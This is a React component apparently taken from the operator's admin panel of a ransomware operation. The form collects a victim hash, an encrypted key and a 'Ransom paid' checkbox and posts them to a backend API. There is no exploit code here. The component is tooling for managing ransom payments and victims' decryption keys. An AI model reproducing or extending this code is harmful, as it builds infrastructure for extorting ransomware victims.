import React, { useState } from 'react'

import api from '../../client'

const KeySubmit = () => {
  const [key, setKey] = useState("");
  const [hash, setHash] = useState("");
  const [checked, setChecked] = useState(false)
  const [loading, setLoading] = useState(false)
  const [res, setRes] = useState(null)

  const submit = async () => {
    setLoading(true)
    setRes(null)
    const res = await api.submitKey({ key, hash, paid: checked })
    console.log(res)
    setRes(res.status === 200)
    setLoading(false)
  }

  // const keyDown = async () => submit()

  return (
    <main className="bg-gray-800 h-screen w-screen flex flex-col justify-center items-center">
      <section className="bg-gray-800 flex flex-col h-20 text-center w-2/6 text-teal text-lg">
        <span>Enter the hash</span>
        <input type="text" className="placeholder-white text-center bg-gray-800 outline-none w-1/1 border-b border-teal"
          onChange={e => setHash(e.target.value)} value={hash} />
      </section>
      <section className="flex flex-col justify-evenly text-center text-teal pb-8">
        <label>Enter encrypted key</label>
        <textarea rows={(key.length / 45).toString()} style={{ width: "45ch" }} value={key} onChange={e => setKey(e.target.value)}
          className="bg-gray-700 max-w-lg scrollbar-thin mt-5 text-green-400 resize-none outline-none scrollbar-thumb-teal scrollbar-track-transparent"
        />
      </section>
      <section className="flex flex-col justify-evenly text-center  pb-8" >
        <label className="flex items-center text-xl flex-col ">
          <span className="ml-2 text-teal">Ransom paid</span>
          <input type="checkbox" className="outline-none focus:outline-none form-checkbox active:outline-none text-teal h-5 w-5 outline-none" checked={checked} onClick={() => setChecked(!checked)} />
        </label>
        <button style={{ cursor: loading ? "default" : "pointer" }}
          disabled={loading} className='outline-none bg-transparent w-max mt-10 mr-auto ml-auto resize-none hover:bg-green-400 text-green-600 font-semibold hover:text-white py-2 px-4 border border-green-400 hover:border-transparent rounded'
          onClick={() => submit()}>
          {loading ? "Loading..." : "Submit key"}
        </button>
        {res !== null &&
          <span className={`text-xl text-center ${res ? 'text-green-500' : 'text-red-500'}`}>
            {res ? "Success" : "Failed"}
          </span>
        }
      </section>
    </main >
  )
}

export default KeySubmit